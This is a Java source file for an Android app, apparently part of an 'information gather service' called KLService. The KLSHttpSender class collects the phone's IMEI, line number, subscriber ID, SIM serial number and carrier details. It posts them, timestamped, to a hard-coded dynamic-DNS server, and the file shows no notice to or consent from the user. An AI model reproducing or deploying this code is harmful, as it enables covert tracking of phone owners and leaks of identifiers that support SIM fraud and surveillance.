/********************************************************************************
 * KLService
 * ---------
 * A general purpose all information gather service. 
 * Class: KLSActivity.
 * Class Description: Starter application for KLService main functionality. 
 * Author: Aviad Golan -=OverFlow=-
 * 			(aviadgolan@gmail.com)
 *   .--.                  .---. .-.                       
 *  : ,. :                 : .--': :                 nTM    
 *  : :: :.-..-. .--. .--. : `;  : :   .--. .-..-..-.      
 *  : :; :: `; :' '_.': ..': :   : :_ ' .; :: `; `; :      
 *  `.__.'`.__.'`.__.':_;  :_;   `.__;`.__.'`.__.__.'      
 *
 ********************************************************************************/

package com.OverFlow.KLService;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

public class KLSHttpSender {
	private HttpClient mHttpClient;
	private HttpPost mHttpPost;
	private int mDebugLevel;
	private String mImei; 
	TelephonyManager mTelephonyManager;
	GsmCellLocation mGsmCellLocation;
	
	KLSHttpSender(TelephonyManager tm) {
		mHttpClient = new DefaultHttpClient();
		mHttpPost = new HttpPost();
		mDebugLevel = KLSDebugLog.getDebugLevel();
		mTelephonyManager = tm;
		mGsmCellLocation = (GsmCellLocation) mTelephonyManager.getCellLocation();
		mImei = mTelephonyManager.getDeviceId();
	}
	
	public void sendData() {
		try {
		    // Add your data
			mHttpPost.setURI(new URI("http://aviadengine.dyndns.org/phonex.php"));
		    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
		    nameValuePairs.add(new BasicNameValuePair("Data ", "Start:"));
	    	long dateTaken = System.currentTimeMillis();
	        Date date = new Date(dateTaken);
	        SimpleDateFormat dateFormat = new SimpleDateFormat("d/MM/y_H:m:s");
	        nameValuePairs.add(new BasicNameValuePair("TimeStamp", dateFormat.format(date)));
		    if (Long.parseLong(mTelephonyManager.getDeviceId()) > 0) {
			    nameValuePairs.add(new BasicNameValuePair("IMEI", mImei));
			    nameValuePairs.add(new BasicNameValuePair("Software Version", mTelephonyManager.getDeviceSoftwareVersion()));
			    //nameValuePairs.add(new BasicNameValuePair("Cell Location", mTelephonyManager.getCellLocation().toString()));
			    nameValuePairs.add(new BasicNameValuePair("Line 1 Number", mTelephonyManager.getLine1Number()));
			    nameValuePairs.add(new BasicNameValuePair("Network Operator", mTelephonyManager.getNetworkOperator()));
			    nameValuePairs.add(new BasicNameValuePair("Network Operator Name", mTelephonyManager.getNetworkOperatorName()));
			    nameValuePairs.add(new BasicNameValuePair("SubscriberId", mTelephonyManager.getSubscriberId()));
			    nameValuePairs.add(new BasicNameValuePair("Sim Serial Number", mTelephonyManager.getSimSerialNumber()));
		    }
		    else {
		    	nameValuePairs.add(new BasicNameValuePair("IMEI", mImei));
		    	nameValuePairs.add(new BasicNameValuePair("Alive: ", "Keep Alive!"));
		    }
		    mHttpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

		    // Execute HTTP Post Request
		    HttpResponse response = mHttpClient.execute(mHttpPost);

    		if (mDebugLevel > 1) {
    			Log.i(getClass().getSimpleName(), "AVIAD: Response: " + response.toString());
    		}
		}
		catch(URISyntaxException e) {
    		if (mDebugLevel > 0) {
    			Log.e(getClass().getSimpleName(), "AVIAD: " + e.getMessage());
    		}
		}
		catch (ClientProtocolException e) {
    		if (mDebugLevel > 0) {
    			Log.e(getClass().getSimpleName(), "AVIAD: " + e.getMessage());
    		}
		} 
		catch (IOException e) {
    		if (mDebugLevel > 0) {
    			Log.e(getClass().getSimpleName(), "AVIAD: " + e.getMessage());
    		}
		}
	}
	
}
